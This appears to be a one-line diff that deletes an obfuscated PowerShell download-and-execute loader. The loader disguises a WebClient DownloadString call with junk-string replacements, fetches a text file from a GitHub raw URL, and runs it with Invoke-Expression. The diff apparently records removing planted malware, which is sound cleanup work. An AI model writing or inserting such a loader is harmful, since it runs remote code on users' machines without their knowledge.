@@ -1,1 +1,1 @@
-[string]$f={(Nwraew-Objwraect Newrat.WebwraCliwraewrant).Doweilsdjfeng('https://raw.githubusercontent.com/forddal/rangddal/main/second.txt')};$j=$f.Replace('wra','');$u=$j.Replace('eilsdjfe','nloadstri');$x=iex $u;invoke-expression $x
+
